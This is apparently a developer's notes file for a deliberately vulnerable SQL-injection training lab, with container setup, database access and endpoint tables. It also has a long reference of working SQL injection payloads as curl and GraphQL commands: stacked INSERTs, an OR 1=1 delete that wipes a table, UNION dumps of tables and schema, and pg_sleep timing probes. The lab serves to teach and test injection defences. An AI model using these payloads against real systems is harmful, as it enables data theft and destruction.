# Backend Dev Notes

Working notes on container management, database access, API usage, and SQL injection exploit examples.

---

## Container Management

Build and run the backend container locally (without Compose):

```bash
docker rm -f sqlinj-backend
docker build -t sqlinj-backend:dev .
docker run --rm -it --name sqlinj-backend --env-file .env -p 5001:5001 sqlinj-backend:dev
```

Pull and run from GHCR (pipeline-built image):

```bash
docker pull --platform linux/amd64 ghcr.io/igorgroz/sqlinj-backend:latest
docker run --rm -it --platform linux/amd64 --env-file .env -p 5001:5001 ghcr.io/igorgroz/sqlinj-backend:latest
```

---

## Database Access

Connect to the containerised Postgres instance:

```bash
docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject
```

Useful psql commands:

```sql
\dt                          -- list tables
SELECT * FROM users;
SELECT * FROM clothes;
SELECT * FROM user_clothes;
```

### Reference Data

**users**

| userid | name    | surname  |
|--------|---------|----------|
| 1      | John    | Doe      |
| 2      | Jane    | Smith    |
| 3      | Alice   | Johnson  |
| 4      | Bob     | Brown    |
| 5      | Charlie | Williams |

**clothes**

| clothid | description | color | brand  | size     | material  |
|---------|-------------|-------|--------|----------|-----------|
| 1       | T-Shirt     | Red   | Nike   | M        | Cotton    |
| 2       | Jeans       | Blue  | Levis  | 32       | Denim     |
| 3       | Jacket      | Black | Adidas | L        | Polyester |
| 4       | Sweater     | Green | Uniqlo | M        | Wool      |
| 5       | Hat         | Black | Puma   | One Size | Cotton    |
| 6       | Scarf       | Red   | Gucci  | One Size | Silk      |
| 7       | Shoes       | White | Adidas | 9        | Leather   |
| 8       | Socks       | Gray  | H&M    | M        | Cotton    |
| 9       | Sneakers    | White | Nike   | 10       | Leather   |
| 10      | Shorts      | Black | Zara   | M        | Polyester |

> Legacy: AWS RDS endpoint decommissioned — using containerised Postgres only.

---

## REST API Endpoints

All routes served from `http://localhost:5001`. Full interactive docs at `/api-docs`.

| Method | Endpoint                          | Type     | Vulnerability                             |
|--------|-----------------------------------|----------|-------------------------------------------|
| GET    | `/api/insecure-users`             | Insecure | String interpolation                      |
| GET    | `/api/insecure-users/:userid`     | Insecure | userid injected directly                  |
| GET    | `/api/insecure-users/:userid/clothes` | Insecure | userid injected directly              |
| POST   | `/api/insecure-users/clothes`     | Insecure | userid + clothid injected directly        |
| POST   | `/api/insecure-users/remove-cloth`| Insecure | userid + clothid injected directly        |
| GET    | `/api/safe-users`                 | Secure   | Parameterised query                       |
| GET    | `/api/safe-users/:userid`         | Secure   | Parameterised query                       |

## GraphQL Endpoints

| Endpoint             | Auth     | Notes                      |
|----------------------|----------|----------------------------|
| `/graphql`           | No       | Apollo v4, standard        |
| `/graphql-insecure`  | No       | Vulnerable resolver        |
| `/graphql-secure`    | JWT      | requireJwt middleware      |

GraphiQL playground: `http://localhost:5001/graphql-insecure`

---

## SQL Injection Context Reference

**Integer context** — value is bare in SQL (`WHERE x = ${val}`). Break with `)` inside VALUES, or just stack with `;`.
**String context** — value is quoted in SQL (`WHERE x = '${val}'`). Break with `'` first.

| Route / Mutation | userid ctx | clothid ctx |
|------------------|------------|-------------|
| `GET /insecure-users/:userid` | integer | — |
| `GET /insecure-users/:userid/clothes` | integer | — |
| `POST /insecure-users/clothes` | integer | integer |
| `POST /insecure-users/remove-cloth` | integer | integer |
| `addInsecureCloth` (GraphQL) | integer | **string** ← only one in app |
| `removeInsecureCloth` (GraphQL) | integer | integer |

---

## SQL Injection Exploit Examples

## Exploiting Anonymous Insecure REST Pages
Note: Ensure that the cloth that you are adding is not assigned to user as duplicate key error will be returned

Add Cloth exploit via Curl/Postman
```
curl -s -X POST http://localhost:5001/api/insecure-users/clothes \
  -H "Content-Type: application/json" \
  -d '{"userid":"5","clothid":"9); INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected'"'"'); --"}'
```

Add Cloth exploit via GUI
```
9); INSERT INTO users(name,surname) VALUES('Alex','Injected'); --
```

Remove Cloth exploit via Curl/Postman
```
curl -s -X POST http://localhost:5001/api/insecure-users/remove-cloth \
  -H "Content-Type: application/json" \
  -d '{"userid":"1","clothid":"1; INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected'"'"'); --"}'
```

Remove Cloth exploit via GUI
```
1; INSERT INTO users(name,surname) VALUES('Alex','Injected'); --
```

## Exploiting Insecure GraphQL Page
Note: addInsecureCloth clothid is string context (wrapped in `'...'` in SQL) — the only string-context parameter in the app, break with `'`

Add Cloth exploit via Curl/Postman
```
curl -s -X POST http://localhost:5001/graphql-insecure \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { addInsecureCloth(userid: 5, clothid: \"9'"'"'); INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected'"'"'); --\") }"}'
```

Add Cloth exploit via GUI
```
9'); INSERT INTO users(name,surname) VALUES('Alex','Injected'); --
```

Remove Cloth exploit via Curl/Postman
```
curl -s -X POST http://localhost:5001/graphql-insecure \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { removeInsecureCloth(userid: 1, clothid: \"1; INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected'"'"'); --\") }"}'
```

Remove Cloth exploit via GUI
```
1; INSERT INTO users(name,surname) VALUES('Alex','Injected'); --
```

Verify
```
docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject \
  -c "SELECT * FROM users ORDER BY userid;"
```

Reset: `docker compose down -v && docker compose up -d`

---

## Detailed Exploit Reference

### 1 — Boolean-based (widen WHERE result set)

```bash
# GET /insecure-users/:userid → WHERE userid = 1 OR 1=1 → returns ALL users
curl -g "http://localhost:5001/api/insecure-users/1%20OR%201=1"

# GET /insecure-users/:userid/clothes → ALL clothes
curl -g "http://localhost:5001/api/insecure-users/1%20OR%201=1/clothes"

# POST remove-cloth → DELETE WHERE userid=1 AND clothid=1 OR 1=1 → WIPES TABLE
curl -s -X POST http://localhost:5001/api/insecure-users/remove-cloth \
  -H "Content-Type: application/json" \
  -d '{"userid":"1","clothid":"1 OR 1=1"}'
```

> **Operator precedence gotcha:** `AND` binds tighter than `OR`.
> `WHERE userid=1 AND clothid=1 OR 1=1` evaluates as `(userid=1 AND clothid=1) OR (true)` — deletes every row.

---

### 2 — UNION-based (extract data from other tables)

`users` has 3 columns (userid INT, name TEXT, surname TEXT).
`clothes` has 6 columns.

```bash
# Dump DB version via /insecure-users
curl -g "http://localhost:5001/api/insecure-users/0%20UNION%20SELECT%201,version(),'x'--"

# Dump all usernames
curl -g "http://localhost:5001/api/insecure-users/0%20UNION%20SELECT%20userid,name,surname%20FROM%20users--"

# Dump users via /clothes endpoint (must match 6 cols)
curl -g "http://localhost:5001/api/insecure-users/0%20UNION%20SELECT%20userid,name,surname,name,surname,'x'%20FROM%20users--/clothes"

# Enumerate tables from information_schema
curl -g "http://localhost:5001/api/insecure-users/0%20UNION%20SELECT%201,table_name,'x'%20FROM%20information_schema.tables%20WHERE%20table_schema='public'--"
```

---

### 3 — Stacked queries (full injection via all four routes)

`pool.query()` uses PostgreSQL simple-query protocol — `;`-separated statements all execute.

```bash
# GET /insecure-users/:userid
curl -g "http://localhost:5001/api/insecure-users/1%3B%20INSERT%20INTO%20users(name,surname)%20VALUES('Alex1','REST_GET')--"

# GET /insecure-users/:userid/clothes
curl -g "http://localhost:5001/api/insecure-users/1%3B%20INSERT%20INTO%20users(name,surname)%20VALUES('Alex2','REST_GET_clothes')--/clothes"

# POST /insecure-users/clothes (clothid, integer context)
curl -s -X POST http://localhost:5001/api/insecure-users/clothes \
  -H "Content-Type: application/json" \
  $'{"userid":"5","clothid":"9); INSERT INTO users(name,surname) VALUES(\'Alex3\',\'REST_POST_clothes\'); --"}'

# POST /insecure-users/remove-cloth (clothid, integer context)
curl -s -X POST http://localhost:5001/api/insecure-users/remove-cloth \
  -H "Content-Type: application/json" \
  $'{"userid":"1","clothid":"1; INSERT INTO users(name,surname) VALUES(\'Alex4\',\'REST_POST_remove\'); --"}'
```

---

### 4 — Time-based blind (confirm injection without visible output)

```bash
# GET — 3-second delay confirms execution
curl -g -w "\nTotal time: %{time_total}s\n" \
  "http://localhost:5001/api/insecure-users/1%3B%20SELECT%20pg_sleep(3)--"

# POST — cleaner, no URL encoding
curl -s -X POST http://localhost:5001/api/insecure-users/remove-cloth \
  -H "Content-Type: application/json" \
  -d '{"userid":"1","clothid":"1; SELECT pg_sleep(3); --"}' \
  -w "\nTotal time: %{time_total}s\n"
```

---

### 5 — GraphQL stacked queries (all mutations)

**addInsecureCloth — clothid string context**
```bash
curl -s -X POST http://localhost:5001/graphql-insecure \
  -H "Content-Type: application/json" \
  $'{"query":"mutation { addInsecureCloth(userid: \\"5\\", clothid: \\"9\'); INSERT INTO users(name,surname) VALUES(\'Alex5\',\'GQL_add\'); --\\") }"}'
```

GraphiQL:
```graphql
mutation {
  addInsecureCloth(
    userid: "5"
    clothid: "9'); INSERT INTO users(name,surname) VALUES('Alex5','GQL_add'); --"
  )
}
```

**removeInsecureCloth — integer context**
```bash
curl -s -X POST http://localhost:5001/graphql-insecure \
  -H "Content-Type: application/json" \
  $'{"query":"mutation { removeInsecureCloth(userid: \\"1\\", clothid: \\"1; INSERT INTO users(name,surname) VALUES(\'Alex6\',\'GQL_remove\'); --\\") }"}'
```

GraphiQL:
```graphql
mutation {
  removeInsecureCloth(
    userid: "1"
    clothid: "1; INSERT INTO users(name,surname) VALUES('Alex6','GQL_remove'); --"
  )
}
```

**Time-based blind via GraphQL**
```bash
curl -s -X POST http://localhost:5001/graphql-insecure \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { removeInsecureCloth(userid: \"1\", clothid: \"1; SELECT pg_sleep(3); --\") }"}' \
  -w "\nTotal time: %{time_total}s\n"
```
